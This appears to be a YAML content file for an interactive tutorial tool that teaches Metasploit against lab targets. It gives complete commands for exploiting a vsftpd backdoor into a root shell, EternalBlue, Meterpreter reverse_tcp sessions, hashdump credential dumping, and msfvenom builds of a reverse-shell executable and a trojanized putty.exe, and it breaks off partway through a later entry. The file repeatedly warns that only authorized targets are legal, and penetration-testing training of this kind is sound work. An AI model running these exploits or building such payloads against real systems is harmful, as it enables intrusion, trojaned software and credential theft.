tool_id: metasploit
display_name: "Metasploit Framework"
binary_candidates: [msfconsole, msfvenom]
categories: [exploitation, post_exploitation]
os_profile: kali
one_liner: "A framework to find, configure, and launch exploits + manage post-exploitation, against authorized targets."
authorization_gate: true
authorization_text: >
  Metasploit launches real exploits and grants real access. Using it against systems you do
  not own or lack explicit written permission to test is a serious crime. Continue only for
  authorized targets. Practice on Metasploitable 2/3, your own VMs, HackTheBox, TryHackMe,
  VulnHub. Continue?
flows:
  - flow_id: guided
    title: "Guided first exploit (START HERE)"
    goal: "From a legal target to a live session — the msfconsole workflow, each input explained."
    command_builder_id: msfconsole
    slots: [PROGRAM, GLOBAL_OPTIONS, ACTION_OPTIONS]
    steps:
      - step_id: g1
        title: "Set up a legal practice target + start the database"
        slot_target: null
        glossary_refs: [framework, msfdb]
        explanation:
          what: "Metasploit fires REAL exploits, so you practise against a deliberately-vulnerable target you control. Its database (PostgreSQL) stores the hosts, services and loot you find."
          why: "You must never point this at a system you're not authorized to test. The DB is optional but makes an engagement far easier to organise."
          where: "System setup, before you open the console."
        find_it: >
          Free legal targets: Metasploitable 2 or 3 (a purpose-built vulnerable VM), or
          HackTheBox / TryHackMe machines. Download Metasploitable, run it in VirtualBox on a
          host-only network, and note its IP. Then start the database as shown.
        command_anatomy:
          - {token: "sudo systemctl start postgresql", does: "start the PostgreSQL database service"}
          - {token: "sudo msfdb init", does: "create Metasploit's database"}
        try_this: "sudo systemctl start postgresql && sudo msfdb init"
        success_criteria: "It reports the database was created/initialised with no errors."
        expected_output: |
          [+] Starting database
          [+] Creating database user 'msf'
          [+] Creating databases 'msf'
          [+] Database initialization successful
        alternatives:
          - trigger: "msfdb: command not found or DB errors"
            cause: "Metasploit/PostgreSQL not fully installed."
            fix: "Install/repair: `sudo apt update && sudo apt install metasploit-framework`; see the Services troubleshooter for PostgreSQL."
            check: "msfdb init completes."
          - trigger: "'already initialized' / database or user already exists"
            cause: "Not an error — you (or a previous boot) already set this up before, possibly a while ago. This is the normal state on a returning session, not a fresh one."
            fix: "Don't re-run init or reinit for this. Skip straight to step 2 (`db_status`) to confirm it's usable. Only `sudo msfdb reinit` if the DB is actually broken and you're OK wiping stored hosts/loot."
            check: "db_status (step 2) reports connected."
          - trigger: "postgresql: 'already running' / systemctl start reports no change"
            cause: "Not an error — the service was already active, likely from an earlier session or auto-start on boot."
            fix: "Nothing to fix — proceed straight to msfdb init / db_status."
            check: "`systemctl status postgresql` shows active (running)."
      - step_id: g2
        title: "Open the console and confirm the database"
        slot_target: ACTION_OPTIONS
        glossary_refs: [msfdb, datastore]
        explanation:
          what: "`msfconsole` is the main interface. `-q` starts it quietly; `db_status` confirms it's connected to PostgreSQL."
          why: "Confirming the DB now avoids surprises later when you want to store scan results and loot."
          where: "-x runs commands then drops you at the msf prompt."
        find_it: "No input needed. Inside the console the prompt looks like `msf6 >`. Type `exit` to leave."
        command_anatomy:
          - {token: "msfconsole", does: "launch the Metasploit console"}
          - {token: "-q", does: "quiet — skip the banner"}
          - {token: "-x \"db_status\"", does: "run db_status on startup"}
        try_this: "msfconsole -q -x \"db_status\""
        success_criteria: "It prints that it's connected to the msf database."
        expected_output: |
          [*] Connected to msf. Connection type: postgresql.
          msf6 >
        alternatives:
          - trigger: "db_status shows not connected"
            cause: "PostgreSQL isn't running or the DB wasn't initialised."
            fix: "Run step 1 again: start postgresql, `sudo msfdb reinit`."
            check: "db_status says connected."
          - trigger: "you skipped step 1 because it was already set up from before"
            cause: "That's the expected path on a returning session — nothing wrong."
            fix: "No fix needed. If db_status connects here, you're good to continue straight to step 3."
            check: "db_status reports connected."
      - step_id: g3
        title: "Find an exploit for a known weakness"
        slot_target: ACTION_OPTIONS
        glossary_refs: [module_types, exploit]
        explanation:
          what: "`search` finds modules; `use <n>` selects one; `show options` lists what you must configure. Metasploitable's vsftpd 2.3.4 has a famous backdoor — a safe, reliable first exploit."
          why: "You pick an exploit that matches a service/version you found during recon (with the nmap tool)."
          where: "These are console commands run in sequence."
        find_it: >
          Run nmap against your target first (`nmap -sV <target>`) to see service versions. Then
          search Metasploit for that software or its CVE. For this walk-through we use the
          well-known vsftpd 2.3.4 backdoor on Metasploitable.
        command_anatomy:
          - {token: "search type:exploit name:vsftpd", does: "find vsftpd exploit modules"}
          - {token: "use exploit/unix/ftp/vsftpd_234_backdoor", does: "select that module"}
          - {token: "show options", does: "list the settings you must fill in"}
        try_this: "msfconsole -q -x \"use exploit/unix/ftp/vsftpd_234_backdoor; show options\""
        success_criteria: "The prompt changes to the module and shows an options table (RHOSTS is required and blank)."
        expected_output: |
          [*] Using exploit/unix/ftp/vsftpd_234_backdoor
          Name    Current Setting  Required  Description
          ----    ---------------  --------  -----------
          RHOSTS                   yes       The target host(s)
          RPORT   21               yes       The target port
        alternatives:
          - trigger: "search returns too many / nothing"
            cause: "Terms too broad or misspelled."
            fix: "Add filters: `search type:exploit platform:unix name:vsftpd`, or search by CVE: `search cve:2011-2523`."
            check: "You can `use` a specific module path."
      - step_id: g4
        title: "Configure the exploit (RHOSTS = target, LHOST = you)"
        slot_target: ACTION_OPTIONS
        glossary_refs: [rhosts_lhost, payload]
        explanation:
          what: "`set RHOSTS <target-ip>` tells it who to attack. Reverse payloads also need `set LHOST <your-ip>` (where the target connects BACK to) and `set LPORT`. `check` tests without firing where supported."
          why: "The #1 beginner mistake is LHOST — it must be YOUR machine's IP on the network the target can reach, not the target's."
          where: "Console `set` commands; values live in the module's datastore."
        find_it: >
          RHOSTS = your target VM's IP. LHOST = YOUR Kali IP — find it with `ip a` (the inet
          line on the interface facing the target, e.g. 10.0.0.5). This vsftpd module opens a
          shell directly, so it doesn't need LHOST; most reverse exploits do.
        command_anatomy:
          - {token: "set RHOSTS 10.0.0.20", does: "the target to attack"}
          - {token: "set LHOST 10.0.0.5", does: "YOUR IP (for reverse payloads) — from `ip a`"}
          - {token: "check", does: "test whether the target looks vulnerable (if supported)"}
        try_this: "msfconsole -q -x \"use exploit/unix/ftp/vsftpd_234_backdoor; set RHOSTS 10.0.0.20; show options\""
        success_criteria: "RHOSTS now shows your target and no required option is blank."
        expected_output: |
          RHOSTS  10.0.0.20  yes  The target host(s)
          Payload options (cmd/unix/interact): (none required)
        alternatives:
          - trigger: "'missing required option'"
            cause: "A required datastore value (often RHOSTS or LHOST) is still blank."
            fix: "Run `show options` and `set` each blank required field."
            check: "show options shows no empty required rows."
          - trigger: "you're not sure which IP is LHOST"
            cause: "Confusing your IP with the target's."
            fix: "Run `ip a`; LHOST is YOUR address on the same network as the target (starts the same, e.g. 10.0.0.x)."
            check: "LHOST is your Kali IP."
      - step_id: g5
        title: "Run the exploit"
        slot_target: ACTION_OPTIONS
        glossary_refs: [session, job]
        explanation:
          what: "`exploit` (or `run`) fires the module. On success you get a session — a foothold on the target."
          why: "This is the payoff: a working session means the vulnerability was real and exploitable."
          where: "Console `exploit` command; add -j to background a listener."
        find_it: "No new input — everything was set in step 4. Just run it."
        command_anatomy:
          - {token: "use exploit/unix/ftp/vsftpd_234_backdoor", does: "the module"}
          - {token: "set RHOSTS 10.0.0.20", does: "the target"}
          - {token: "exploit", does: "launch the exploit"}
        try_this: "msfconsole -q -x \"use exploit/unix/ftp/vsftpd_234_backdoor; set RHOSTS 10.0.0.20; exploit\""
        success_criteria: "It reports a session opened (a command shell or Meterpreter)."
        expected_output: |
          [+] Backdoor service has been spawned, handling...
          [+] UID: uid=0(root) gid=0(root)
          [*] Command shell session 1 opened (10.0.0.5 -> 10.0.0.20:6200)
        alternatives:
          - trigger: "Exploit completed, but no session was created"
            cause: "Wrong target/payload, host already patched, or LHOST/port/firewall wrong."
            fix: "Confirm the version with `nmap -sV`; verify LHOST is your IP; check no firewall blocks the callback port."
            check: "nmap confirms the vulnerable service; LHOST/LPORT are correct."
          - trigger: "connection refused / unreachable"
            cause: "Target IP wrong or not routable from Kali."
            fix: "Ping/nmap the target; make sure both VMs are on the same host-only network."
            check: "You can reach the target with nmap."
      - step_id: g6
        title: "Interact with your session"
        slot_target: ACTION_OPTIONS
        glossary_refs: [meterpreter, session]
        explanation:
          what: "`sessions -l` lists sessions; `sessions -i <id>` drops you into one. In a shell try `id`/`whoami`; in Meterpreter try `sysinfo`, `getuid`, `hashdump`."
          why: "This is where you confirm and use your access. `hashdump` output feeds the john/hashcat tools for offline cracking."
          where: "Console `sessions` command; then the session's own commands."
        find_it: "Use the session id from step 5 (usually 1). `background` returns you to the console; `exit` closes the session."
        command_anatomy:
          - {token: "sessions -l", does: "list open sessions"}
          - {token: "sessions -i 1", does: "interact with session 1"}
          - {token: "(then) id / sysinfo / getuid", does: "confirm who and where you are"}
        try_this: "msfconsole -q -x \"sessions -l\"   # then: sessions -i 1  ->  id"
        success_criteria: "You land in the session and commands return data (e.g. uid=0(root))."
        expected_output: |
          Active sessions
          Id  Type         Information  Connection
          1   shell cmd/unix            10.0.0.5 -> 10.0.0.20:6200
          $ id
          uid=0(root) gid=0(root)
        alternatives:
          - trigger: "the session dies quickly"
            cause: "The host process it rode is unstable."
            fix: "In Meterpreter, `ps` then `migrate <pid>` into a stable process."
            check: "The session stays alive after migrate."
          - trigger: "no sessions listed"
            cause: "The exploit didn't actually land."
            fix: "Go back to steps 4-5; re-check options and target reachability."
            check: "exploit reports a session opened."
  - flow_id: resume_existing
    title: "Already set up or running? Check before you start fresh (reference)"
    goal: "You've used Metasploit before on this box — check what's already running/stored so you don't clobber it or fight stale state."
    command_builder_id: msfconsole
    slots: [PROGRAM, GLOBAL_OPTIONS, ACTION_OPTIONS]
    steps:
      - step_id: re1
        title: "Check what's already running before touching setup again"
        slot_target: null
        glossary_refs: [msfdb]
        explanation:
          what: "Before repeating first-time setup, check whether PostgreSQL is already running, whether another msfconsole is already open, and whether the DB is already connected."
          why: "'Already initialized', 'already running', or 'already exists' messages are the NORMAL state on a returning session — they are not errors, and re-running init/reinit on top of them is unnecessary and (for reinit) destructive."
          where: "Run from a plain terminal, before opening a new console."
        find_it: "No input needed — these are read-only checks."
        command_anatomy:
          - {token: "pgrep -a msfconsole", does: "list any msfconsole process(es) already running, with their PID"}
          - {token: "systemctl status postgresql", does: "check whether the database service is already active"}
          - {token: "msfconsole -q -x \"db_status\"", does: "confirm whether the console can already reach the DB"}
        try_this: "pgrep -a msfconsole; systemctl status postgresql --no-pager"
        success_criteria: "You know, before doing anything else, whether a console/DB is already up — so the next steps are 'resume' not 'reinstall'."
        expected_output: |
          12345 msfconsole
          ● postgresql.service - PostgreSQL RDBMS
               Active: active (running) since ...
        alternatives:
          - trigger: "pgrep shows an existing msfconsole PID"
            cause: "You (or another terminal) already have a console open — it may already hold active jobs/sessions in memory."
            fix: "Switch to that terminal instead of opening a second, separate console — a second instance does NOT share the first one's in-memory jobs/sessions, only the DB."
            check: "In the existing terminal, run `jobs -l` / `sessions -l` to see what it's already holding."
      - step_id: re2
        title: "List existing jobs and sessions before starting something new"
        slot_target: ACTION_OPTIONS
        glossary_refs: [job, session]
        explanation:
          what: "`jobs -l` lists backgrounded tasks (handlers, running scanners); `sessions -l` lists live target connections. Run both as the FIRST thing in a console you didn't just open fresh."
          why: "Starting a new handler on a port a stale job already holds, or losing track of a still-open session from earlier, are the two most common 'I thought this was a clean start' surprises."
          where: "ACTION_OPTIONS (-x script), right after the console opens."
        find_it: "No input needed — read-only listing."
        command_anatomy:
          - {token: "jobs -l", does: "list running background jobs (e.g. handlers) with their id and port"}
          - {token: "sessions -l", does: "list active sessions with their id and target"}
        try_this: "msfconsole -q -x \"jobs -l; sessions -l\""
        success_criteria: "You see every job/session that's already active (or an empty list, confirming a genuinely clean slate) before starting anything new."
        expected_output: |
          Jobs
          Id  Name                            Payload
          0   Exploit: multi/handler          windows/x64/meterpreter/reverse_tcp
          Active sessions
          (none)
        alternatives:
          - trigger: "a job or session shows up that you don't need anymore"
            cause: "Leftover from an earlier engagement/test run — background jobs and sessions persist until you close them or the console exits."
            fix: "`jobs -k <id>` kills a background job; `sessions -k <id>` kills a session. Do this before starting a new one that might conflict (e.g. same port)."
            check: "Re-run `jobs -l` / `sessions -l` — the id is gone."
      - step_id: re3
        title: "Reuse an existing workspace instead of assuming a fresh one"
        slot_target: ACTION_OPTIONS
        glossary_refs: [workspace]
        explanation:
          what: "`workspace -l` lists every workspace already stored in the DB; `workspace <name>` (no -a) switches to one that already exists. `-a <name>` only makes sense for a genuinely new name."
          why: "`workspace -a lab` doesn't fail if 'lab' already exists — it just switches to it — but if you typed a name that DOESN'T already exist, -a silently creates a new, empty one, and your prior hosts/loot are still sitting in whatever workspace you actually used last time."
          where: "ACTION_OPTIONS (-x script)."
        find_it: "No input for -l; an existing workspace name (from the -l list) to switch to."
        command_anatomy:
          - {token: "workspace -l", does: "list all workspaces that already exist"}
          - {token: "workspace lab", does: "switch to the existing 'lab' workspace (no -a)"}
        try_this: "msfconsole -q -x \"workspace -l\""
        success_criteria: "You can see every workspace that already has data, and pick the right one by name."
        expected_output: |
          Workspaces
          * default
            lab
        alternatives:
          - trigger: "hosts/services look empty right after `workspace -a <name>`"
            cause: "That name didn't already exist, so -a just created a brand-new, empty workspace — your earlier data is in a different, already-existing one."
            fix: "`workspace -l` to see what actually exists, then `workspace <existing-name>` (no -a) to switch to it."
            check: "hosts / services now show the expected prior data."
      - step_id: re4
        title: "'Address already in use' when starting a listener"
        slot_target: ACTION_OPTIONS
        glossary_refs: [job, handler]
        explanation:
          what: "Starting exploit/multi/handler (or any listener) on a port a previous job already holds fails with an address-in-use style error."
          why: "A crashed terminal, a forgotten `-j` background job, or simply not knowing step 2's `jobs -l` check can leave a listener still bound to that LPORT from earlier."
          where: "Same ACTION_OPTIONS script that starts the handler (see the Handler flow)."
        find_it: "The job id holding the port, from `jobs -l`."
        command_anatomy:
          - {token: "jobs -l", does: "find the id of the job already bound to that port"}
          - {token: "jobs -k <id>", does: "kill it, freeing the port"}
        try_this: "msfconsole -q -x \"jobs -l\"   # then: jobs -k <id>   # then retry the handler"
        success_criteria: "The handler starts cleanly, or `jobs -l` confirms the old one on that port is gone."
        expected_output: |
          [-] Handler failed to bind to 10.0.0.5:4444
          Jobs
          Id  Name
          0   Exploit: multi/handler
        alternatives:
          - trigger: "'Address already in use' persists after killing the job"
            cause: "A different process entirely (outside Metasploit) already owns that port."
            fix: "Check with `sudo ss -ltnp | grep 4444` (or the port in question) and stop that process, or just pick a different LPORT for the new handler."
            check: "The port is free (not listed by ss), or the handler uses a different LPORT."

  - flow_id: setup_db
    title: "Setup & database (reference)"
    goal: "Start PostgreSQL so the console can store hosts/loot."
    command_builder_id: msfconsole
    slots: [PROGRAM, GLOBAL_OPTIONS, ACTION_OPTIONS]
    steps:
      - step_id: ms1
        title: "Init the DB and check db_status"
        slot_target: ACTION_OPTIONS
        glossary_refs: [framework, msfdb, datastore]
        explanation:
          what: "`sudo systemctl start postgresql` -> `sudo msfdb init` -> in console `db_status` (expect connected)."
          why: "The DB stores hosts/services/loot (optional but very useful)."
          where: "System + console grammar (step 0)."
        find_it: "Just system access; run before opening the console."
        command_anatomy:
          - {token: "systemctl start postgresql", does: "start the database service"}
          - {token: "msfdb init", does: "create Metasploit's DB"}
          - {token: "db_status", does: "(in console) confirm connection"}
        try_this: "sudo systemctl start postgresql && sudo msfdb init   # then msfconsole -q -x \"db_status\""
        success_criteria: "db_status shows connected."
        expected_output: |
          [*] Connected to msf. Connection type: postgresql.
        alternatives:
          - trigger: "not connected"
            cause: "PostgreSQL not running or DB not initialised."
            fix: "Start/enable postgresql; re-run msfdb init (or msfdb reinit)."
            check: "See the Services troubleshooter for PostgreSQL."
  - flow_id: search_use
    title: "Find & select a module (reference)"
    goal: "Search and select a module, then inspect it."
    command_builder_id: msfconsole
    slots: [PROGRAM, GLOBAL_OPTIONS, ACTION_OPTIONS]
    steps:
      - step_id: ms2
        title: "search -> use -> show options"
        slot_target: ACTION_OPTIONS
        glossary_refs: [module_types, exploit]
        explanation:
          what: "`search type:exploit name:eternalblue`, then `use <n|path>`; inspect with info / show options / show payloads / show targets."
          why: "Console grammar step 1-2: SELECT then INSPECT."
          where: "ACTION_OPTIONS (-x script)."
        find_it: "A service/version or CVE from recon to search for."
        command_anatomy:
          - {token: "search type:exploit name:eternalblue", does: "find matching exploit modules"}
          - {token: "use 0", does: "select result number 0"}
          - {token: "show options", does: "list settings to configure"}
        try_this: "msfconsole -q -x \"search type:exploit name:eternalblue; use 0; show options\""
        success_criteria: "The prompt changes to the module; show options lists what to set."
        expected_output: |
          [*] Using exploit/windows/smb/ms17_010_eternalblue
          RHOSTS  (blank)  yes  The target host(s)
        alternatives:
          - trigger: "too many results"
            cause: "Search too broad."
            fix: "Add filters (type/platform/cve/rank)."
            check: "Re-search with more filters."
          - trigger: "nothing found"
            cause: "Wrong terms/spelling."
            fix: "Broaden or correct the search terms."
            check: "Try a CVE filter."
  - flow_id: configure_run
    title: "Configure & run an exploit (reference)"
    goal: "Set the datastore and fire."
    command_builder_id: msfconsole
    slots: [PROGRAM, GLOBAL_OPTIONS, ACTION_OPTIONS]
    steps:
      - step_id: ms3
        title: "set RHOSTS/PAYLOAD/LHOST/LPORT -> check -> exploit"
        slot_target: ACTION_OPTIONS
        glossary_refs: [rhosts_lhost, payload, job, session]
        explanation:
          what: "`set RHOSTS <target>`, `set PAYLOAD <path>`, reverse payloads need `set LHOST <your-ip>` + `set LPORT`; `setg` is global; `check` then `exploit` (-j background, -z don't interact)."
          why: "Console grammar step 3-5: CONFIGURE -> VERIFY -> RUN."
          where: "ACTION_OPTIONS (-x script)."
        find_it: "RHOSTS = target IP; LHOST = your IP from `ip a`; pick a payload from `show payloads`."
        command_anatomy:
          - {token: "set RHOSTS 10.0.0.20", does: "the target"}
          - {token: "set PAYLOAD .../reverse_tcp", does: "the payload to deliver"}
          - {token: "set LHOST 10.0.0.5", does: "your IP for the callback"}
          - {token: "check; exploit", does: "verify then launch"}
        try_this: "msfconsole -q -x \"use <exploit>; set RHOSTS 10.0.0.20; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST 10.0.0.5; set LPORT 4444; check; exploit\""
        success_criteria: "'Meterpreter session N opened' (or the exploit's success message)."
        expected_output: |
          [*] Meterpreter session 1 opened (10.0.0.5:4444 -> 10.0.0.20:49512)
        alternatives:
          - trigger: "missing required option"
            cause: "A required datastore value (often RHOSTS/LHOST) is blank."
            fix: "`show options` and set the blanks."
            check: "Re-run show options."
          - trigger: "Exploit completed, but no session was created"
            cause: "Wrong target/payload arch, host patched, or LHOST/port/firewall wrong."
            fix: "Adjust payload/target; confirm reachability with nmap; verify LHOST is your IP on the route."
            check: "nmap the target; double-check LHOST/LPORT."
  - flow_id: auxiliary
    title: "Auxiliary modules (reference)"
    goal: "Recon/enumeration without exploiting."
    command_builder_id: msfconsole
    slots: [PROGRAM, GLOBAL_OPTIONS, ACTION_OPTIONS]
    steps:
      - step_id: ms4
        title: "use auxiliary/scanner -> set RHOSTS -> run"
        slot_target: ACTION_OPTIONS
        glossary_refs: [auxiliary]
        explanation:
          what: "`use auxiliary/scanner/<…>`, `set RHOSTS <range>`, `run`; results can store in the DB."
          why: "A safe way to learn the workflow — no payload fired."
          where: "ACTION_OPTIONS (-x script)."
        find_it: "A target range for RHOSTS (e.g. 10.0.0.0/24)."
        command_anatomy:
          - {token: "use auxiliary/scanner/smb/smb_version", does: "an SMB version scanner (no exploit)"}
          - {token: "set RHOSTS 10.0.0.0/24", does: "the range to scan"}
          - {token: "run", does: "execute the scanner"}
        try_this: "msfconsole -q -x \"use auxiliary/scanner/smb/smb_version; set RHOSTS 10.0.0.0/24; run\""
        success_criteria: "Scanner results print (and store in hosts/services)."
        expected_output: |
          [*] 10.0.0.20:445 - Host is running Windows 7 (build:7601)
        alternatives:
          - trigger: "no results"
            cause: "Wrong RHOSTS range or service absent."
            fix: "Confirm the range and that the service exists (nmap)."
            check: "Re-run against a known host."
  - flow_id: sessions_meterpreter
    title: "Sessions & Meterpreter (reference)"
    goal: "Interact with an opened session."
    command_builder_id: msfconsole
    slots: [PROGRAM, GLOBAL_OPTIONS, ACTION_OPTIONS]
    steps:
      - step_id: ms5
        title: "sessions -i; meterpreter commands"
        slot_target: ACTION_OPTIONS
        glossary_refs: [meterpreter, session]
        explanation:
          what: "`sessions -l` list, `sessions -i <id>` interact, `background` to detach; in Meterpreter: sysinfo, getuid, ps, migrate <pid>, shell, download/upload, hashdump."
          why: "hashdump output feeds john/hashcat for offline cracking."
          where: "Console grammar step 6: INTERACT."
        find_it: "The session id from a successful exploit (sessions -l)."
        command_anatomy:
          - {token: "sessions -i 1", does: "interact with session 1"}
          - {token: "sysinfo / getuid / hashdump", does: "identify the host, user, and dump hashes"}
        try_this: "msfconsole -q -x \"sessions -i 1\"   # then in meterpreter: sysinfo; getuid; hashdump"
        success_criteria: "Meterpreter responds; commands return data."
        expected_output: |
          Computer: WIN-TARGET
          OS      : Windows 7
          meterpreter > getuid
          Server username: NT AUTHORITY\SYSTEM
        alternatives:
          - trigger: "session dies"
            cause: "Unstable host process."
            fix: "`migrate` to a stable process."
            check: "ps then migrate <pid>."
          - trigger: "no session"
            cause: "Exploit didn't land."
            fix: "Return to the configure/run flow."
            check: "Re-check options and reachability."
  - flow_id: post
    title: "Post-exploitation modules (reference)"
    goal: "Run after-access tasks against a session."
    command_builder_id: msfconsole
    slots: [PROGRAM, GLOBAL_OPTIONS, ACTION_OPTIONS]
    steps:
      - step_id: ms6
        title: "use post/... -> set SESSION -> run"
        slot_target: ACTION_OPTIONS
        destructive: true
        recovery: "Post modules act on a live compromised host — authorized engagements only."
        glossary_refs: [post]
        explanation:
          what: "With a session open: `use post/<platform>/<…>`, `set SESSION <id>`, `run`."
          why: "Gather creds, enumerate, or (authorized) persistence."
          where: "ACTION_OPTIONS (-x script)."
        find_it: "An open session id and a post module matching its OS."
        command_anatomy:
          - {token: "use post/windows/gather/hashdump", does: "a Windows credential-gathering module"}
          - {token: "set SESSION 1", does: "run it against session 1"}
          - {token: "run", does: "execute the post module"}
        try_this: "msfconsole -q -x \"use post/windows/gather/hashdump; set SESSION 1; run\""
        success_criteria: "The post module returns its data (e.g. dumped hashes)."
        expected_output: |
          Administrator:500:aad3b435...:31d6cfe0d16ae931b73c59d7e0c089c0:::
        alternatives:
          - trigger: "module incompatible"
            cause: "Wrong platform/session type."
            fix: "Pick a post module matching the session's OS."
            check: "sessions -l shows the platform."
  - flow_id: payloads
    title: "Payloads deep-dive (reference)"
    goal: "Choose staged/stageless and reverse/bind correctly."
    command_builder_id: msfconsole
    slots: [PROGRAM, GLOBAL_OPTIONS, ACTION_OPTIONS]
    steps:
      - step_id: ms7
        title: "staged vs stageless; reverse vs bind"
        slot_target: ACTION_OPTIONS
        glossary_refs: [staged_stageless, reverse_bind]
        explanation:
          what: "Staged uses `/` (small stager + stage); stageless uses `_` (one self-contained blob). Reverse connects back to your LHOST (NAT-friendly); bind opens a port on the target."
          why: "Reverse is the usual choice through NAT; stageless is more reliable over flaky links."
          where: "Concept; list with `show payloads` after `use <exploit>`."
        find_it: "After `use <exploit>`, run `show payloads` to see compatible options."
        command_anatomy:
          - {token: "windows/.../reverse_tcp", does: "staged (/) reverse payload — connects back to you"}
          - {token: "windows/.../reverse_tcp (with _)", does: "stageless (_) variant — one blob, more reliable"}
        try_this: "msfconsole -q -x \"use <exploit>; show payloads\""
        success_criteria: "You can pick the right payload shape for the situation."
        expected_output: |
          0  payload/windows/x64/meterpreter/reverse_tcp
          1  payload/windows/x64/meterpreter_reverse_tcp
        alternatives:
          - trigger: "unreliable connection"
            cause: "Staged payload over a flaky link."
            fix: "Try a stageless payload (underscore variant)."
            check: "Compare reliability."
  - flow_id: msfvenom
    title: "msfvenom (standalone payload generator) (reference)"
    goal: "Generate a payload file."
    command_builder_id: msfvenom
    slots: [PROGRAM, ACTION_OPTIONS, OUTPUT_OPTIONS]
    steps:
      - step_id: ms8
        title: "Build a reverse_tcp exe"
        slot_target: ACTION_OPTIONS
        destructive: true
        recovery: "A generated payload is real malware on disk — handle only in an authorized lab; encoders are NOT reliable AV evasion."
        glossary_refs: [msfvenom, staged_stageless, reverse_bind]
        explanation:
          what: "`-p <payload> LHOST= LPORT= -f <format> -o <file>`; -e encoder / -b badchars / -a arch / --platform shape it."
          why: "Creates a deliverable payload; you then catch it with multi/handler."
          where: "-p + datastore in ACTION; -f/-o in OUTPUT."
        find_it: "LHOST = your IP (`ip a`); pick a format matching the target OS (exe for Windows, elf for Linux)."
        command_anatomy:
          - {token: "-p windows/x64/meterpreter/reverse_tcp", does: "the payload to generate"}
          - {token: "LHOST=10.0.0.5 LPORT=4444", does: "where it calls back to (your IP/port)"}
          - {token: "-f exe", does: "output format (exe for Windows)"}
          - {token: "-o shell.exe", does: "write the payload to this file"}
        try_this: "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=4444 -f exe -o shell.exe"
        success_criteria: "shell.exe is written."
        expected_output: |
          [-] No platform was selected, choosing Msf::Module::Platform::Windows
          Payload size: 510 bytes
          Saved as: shell.exe
        alternatives:
          - trigger: "unknown format/payload"
            cause: "Typo or unsupported value."
            fix: "List options: --list formats / --list payloads."
            check: "Re-run with a listed value."
      - step_id: ms8t
        title: "Inject the payload into a real-looking executable (template injection)"
        slot_target: ACTION_OPTIONS
        destructive: true
        recovery: "This produces a file that LOOKS AND RUNS like a legitimate program but secretly carries your payload — literally the trojan-creation technique. Only ever use it against software YOU wrote or own, or inside an authorized lab/engagement with a target executable explicitly in scope. Never apply this to real third-party software (installers, downloads, tools you didn't write) — doing so against a system or user you don't have written authorization for is a serious crime, not a lab exercise."
        glossary_refs: [template_injection]
        explanation:
          what: "`-x <file>` uses an EXISTING executable as a template and stitches your payload into it; `-k` (--keep) makes the original program's functionality keep working, with your payload now running alongside it as a new thread — instead of your payload simply replacing the whole file."
          why: "A bare msfvenom payload is an obviously-fake, empty program that does nothing except call home — suspicious to anyone who runs it. Wrapping it around a real, working program (so it still does its normal job) is exactly how attackers make a payload look legitimate. This is taught here so you recognise and defend against it — only ever build it yourself against something you own or are explicitly authorized to test."
          where: "ACTION_OPTIONS; -x names the template file, -k is a flag with no value."
        find_it: "Pick a small executable you own the rights to test with (e.g. a tool you wrote, or one explicitly included in your lab's scope) as the template. It must match the payload's architecture/platform — a 32-bit template needs a 32-bit payload."
        command_anatomy:
          - {token: "msfvenom", does: "the payload generator"}
          - {token: "-p windows/x64/meterpreter/reverse_tcp", does: "the payload to inject"}
          - {token: "LHOST=10.0.0.5 LPORT=4444", does: "where the payload calls back to"}
          - {token: "-x putty.exe", does: "use this existing executable as the template — you supply a file you're authorized to use"}
          - {token: "-k", does: "keep the template's original behaviour working, running the payload alongside it"}
          - {token: "-f exe -o putty_backdoored.exe", does: "output format and filename"}
        try_this: "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=4444 -x putty.exe -k -f exe -o putty_backdoored.exe"
        success_criteria: "putty_backdoored.exe is written and, in a lab, both runs like the original program AND opens a session when executed."
        expected_output: |
          [-] No platform was selected, choosing Msf::Module::Platform::Windows
          [-] No arch selected, selecting arch: x64 from the payload
          [*] Reading Data from putty.exe: 1305600 bytes
          Saved as: putty_backdoored.exe
        alternatives:
          - trigger: "'Invalid template' or the process errors out"
            cause: "The template's architecture/platform doesn't match the payload (e.g. a 32-bit .exe with an x64 payload), or the template file is corrupt/unusual."
            fix: "Match -a/--platform to the template's actual architecture, or pick a plainer/simpler template executable."
            check: "Re-run with a matching -a; try a different template file."
          - trigger: "the resulting file works but its ORIGINAL functionality is gone"
            cause: "-k was omitted — without it, the payload REPLACES the template's code rather than running alongside it."
            fix: "Add -k to preserve the original program's behaviour."
            check: "Re-run with -k; confirm the program still performs its normal function."
          - trigger: "antivirus flags the file immediately"
            cause: "Template injection alone is not evasion — AV/EDR commonly detects known payload signatures regardless of the wrapper."
            fix: "This is expected and not something to 'fix' by evading detection — treat AV catching it as a successful control, not an obstacle. Encoding/packing for evasion is a separate, advanced topic with its own legal and ethical considerations."
            check: "Not a failure — this is the defensive control working as intended."

  - flow_id: msfvenom_deepdive
    title: "msfvenom deep-dive: discover, size & disguise payloads (reference, advanced)"
    goal: "Find out what a payload needs BEFORE building it, then shape its size, encryption and branding."
    command_builder_id: msfvenom
    slots: [PROGRAM, ACTION_OPTIONS, OUTPUT_OPTIONS]
    steps:
      - step_id: mvd1
        title: "Discover what a payload actually needs (--list-options)"
        slot_target: ACTION_OPTIONS
        glossary_refs: [msfvenom, datastore]
        explanation:
          what: "`-p <payload> --list-options` prints that payload's standard, advanced and evasion datastore options — WITHOUT generating anything. It's the payload equivalent of msfconsole's `show options`."
          why: "Every payload path (windows/x64/meterpreter/reverse_tcp vs linux/x86/shell_bind_tcp, etc.) needs different values — some need LPORT only, some need LHOST+LPORT, some need neither. Guessing wastes a build; this tells you exactly what to fill in first."
          where: "ACTION_OPTIONS; nothing else in the command matters when this flag is present — no format/output needed."
        find_it: "Any payload path from `msfvenom --list payloads` (or one you already know, e.g. from the Payloads deep-dive flow)."
        command_anatomy:
          - {token: "msfvenom -p windows/x64/meterpreter/reverse_tcp", does: "the payload you're about to build"}
          - {token: "--list-options", does: "print its options instead of building anything"}
        try_this: "msfvenom -p windows/x64/meterpreter/reverse_tcp --list-options"
        success_criteria: "A table of options (Name, Current Setting, Required, Description) prints — e.g. LHOST/LPORT both marked 'yes' under Required."
        expected_output: |
          Options for payload/windows/x64/meterpreter/reverse_tcp:
          Name   Current Setting  Required  Description
          ----   ---------------  --------  -----------
          LHOST                   yes       The listen address
          LPORT  4444             yes       The listen port
        alternatives:
          - trigger: "'Invalid Payload Selected' or no output"
